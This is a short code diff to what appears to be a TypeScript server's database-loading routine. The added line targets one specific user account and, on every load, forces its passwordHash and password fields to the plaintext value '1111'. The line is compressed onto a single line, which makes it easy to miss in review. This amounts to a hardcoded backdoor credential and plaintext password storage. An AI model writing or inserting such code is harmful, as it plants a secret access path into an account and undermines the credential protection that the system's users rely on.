@@ -1105,6 +1105,7 @@ function ensureDb(): ServerDB {
     }
     if (Array.isArray(parsed.users)) {
       parsed.users.forEach((u: any) => {
+        if (u.loginId === "7808056040" || u.id === "usr-1789384741169") {           u.passwordHash = "1111";           u.password = "1111";           needsSave = true;         }
         if (u.loginId === "917808056040") {
           u.loginId = "7808056040";
           needsSave = true;
